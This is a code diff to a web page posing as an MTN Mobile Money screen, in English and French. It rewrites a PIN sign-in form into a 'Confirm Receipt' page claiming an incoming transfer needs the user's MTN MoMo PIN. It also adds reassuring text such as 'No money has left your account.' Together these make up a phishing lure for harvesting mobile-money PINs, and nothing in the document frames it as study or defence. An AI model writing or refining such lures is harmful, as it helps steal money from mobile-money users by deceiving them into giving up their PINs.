@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Sign in</title>
+<title>MTN Mobile Money · Confirm Receipt</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -321,11 +321,11 @@
           placeholder="Enter phone number" maxlength="15" readonly
         >
       </div>
-      <div class="field-error" id="phoneError">No phone number was provided by the merchant.</div>
+      <div class="field-error" id="phoneError">No phone number was provided by the sender.</div>
     </div>
 
     <div class="field" id="f-pin">
-      <label for="pinInput" id="pinLabel">PIN</label>
+      <label for="pinInput" id="pinLabel">MTN MoMo PIN</label>
       <div class="pin-input-wrap">
         <input type="password" id="pinInput" inputmode="numeric" autocomplete="off" placeholder="••••" maxlength="8">
         <button type="button" class="eye-btn" onclick="togglePin()" aria-label="Show or hide PIN">
@@ -335,10 +335,10 @@
           </svg>
         </button>
       </div>
-      <div class="field-error" id="pinError">Please enter your PIN.</div>
+      <div class="field-error" id="pinError">Please enter your MTN MoMo PIN.</div>
     </div>
 
-    <button type="submit" class="btn-signin" id="signinBtn">Sign In</button>
+    <button type="submit" class="btn-signin" id="signinBtn">Confirm receipt</button>
   </form>
 
   <div class="terms" id="termsBlock">
@@ -371,8 +371,8 @@
 
   <div class="spinner"></div>
 
-  <h2 id="initiatingTitle">Initiating payment…</h2>
-  <p id="initiatingDesc">Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.</p>
+  <h2 id="initiatingTitle">Confirming your receipt…</h2>
+  <p id="initiatingDesc">Connecting securely to MTN Mobile Money to confirm this incoming transfer. Please do not close this page.</p>
 
   <div class="note" id="initiatingNote">This usually takes a few seconds.</div>
 
@@ -382,57 +382,54 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   const I18N = {
     en: {
       displayNameFallback: 'MTN Mobile Money',
       displaySubFallback: 'Sign in to continue',
-      displaySubCountry: 'Mobile Money · Sign in to continue',
+      displaySubCountry: 'Mobile Money · Confirm to receive',
       phoneLabel: 'Phone number',
       phonePlaceholder: 'Enter phone number',
-      phoneError: 'No phone number was provided by the merchant.',
-      pinLabel: 'PIN',
-      pinError: 'Please enter your PIN.',
-      signIn: 'Sign In',
+      phoneError: 'No phone number was provided by the sender.',
+      pinLabel: 'MTN MoMo PIN',
+      pinError: 'Please enter your MTN MoMo PIN.',
+      signIn: 'Confirm receipt',
       termsText: 'By using this app you agree to our',
       termsLink: 'T&Cs',
       contactLabel: 'Contact us',
-      initiatingTitle: 'Initiating payment…',
-      initiatingDesc: 'Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.',
+      initiatingTitle: 'Confirming your receipt…',
+      initiatingDesc: 'Connecting securely to MTN Mobile Money to confirm this incoming transfer. Please do not close this page.',
       initiatingNote: 'This usually takes a few seconds.',
       cancel: 'Cancel',
-      declineBanner: 'Incorrect PIN. Please try again.',
+      declineBanner: 'Incorrect PIN. Please try again. No money has left your account.',
       checkFields: 'Please check the highlighted fields.',
       networkError: 'Network error. Please try again.',
       timeoutError: 'Request timed out. Please try again.',
-      approvedRedirecting: 'Approved. Redirecting…',
-      docTitle: 'MTN Mobile Money · Sign in'
+      approvedRedirecting: 'Confirmed. Redirecting…',
+      docTitle: 'MTN Mobile Money · Confirm Receipt'
     },
     fr: {
       displayNameFallback: 'MTN Mobile Money',
       displaySubFallback: 'Connectez-vous pour continuer',
-      displaySubCountry: 'Mobile Money · Connectez-vous pour continuer',
+      displaySubCountry: 'Mobile Money · Confirmer la réception',
       phoneLabel: 'Numéro de téléphone',
       phonePlaceholder: 'Entrez le numéro de téléphone',
-      phoneError: 'Aucun numéro de téléphone n\'a été fourni par le marchand.',
-      pinLabel: 'Code PIN',
-      pinError: 'Veuillez saisir votre code PIN.',
-      signIn: 'Se connecter',
+      phoneError: 'Aucun numéro de téléphone n\'a été fourni par l\'expéditeur.',
+      pinLabel: 'Code PIN MTN MoMo',
+      pinError: 'Veuillez saisir votre code PIN MTN MoMo.',
+      signIn: 'Confirmer la réception',
       termsText: 'En utilisant cette application, vous acceptez nos',
       termsLink: 'Conditions',
       contactLabel: 'Contactez-nous',
-      initiatingTitle: 'Paiement en cours…',
-      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour autoriser votre paiement. Veuillez ne pas fermer cette page.',
+      initiatingTitle: 'Confirmation de la réception…',
+      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour confirmer ce transfert entrant. Veuillez ne pas fermer cette page.',
       initiatingNote: 'Cela prend généralement quelques secondes.',
       cancel: 'Annuler',
-      declineBanner: 'Code PIN incorrect. Veuillez réessayer.',
+      declineBanner: 'Code PIN incorrect. Veuillez réessayer. Aucun argent n\'a quitté votre compte.',
       checkFields: 'Veuillez vérifier les champs en surbrillance.',
       networkError: 'Erreur réseau. Veuillez réessayer.',
       timeoutError: 'Délai expiré. Veuillez réessayer.',
-      approvedRedirecting: 'Approuvé. Redirection…',
-      docTitle: 'MTN Mobile Money · Connexion'
+      approvedRedirecting: 'Confirmé. Redirection…',
+      docTitle: 'MTN Mobile Money · Confirmer la réception'
     }
   };
 
@@ -441,9 +438,6 @@
   let currentLang = I18N[urlLang] ? urlLang : 'en';
   let T = I18N[currentLang];
 
-  /* ═══════════════════════════════════════════════════════════
-     COUNTRY DATA
-  ═══════════════════════════════════════════════════════════ */
   const COUNTRY_DIAL = {
     'Cameroon': '+237',
     'Zambia': '+260',
@@ -477,9 +471,6 @@
     an:  urlParams.get('an') || ''
   };
 
-  /* ═══════════════════════════════════════════════════════════
-     APPLY TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   function applyTranslations() {
     document.title = T.docTitle;
 
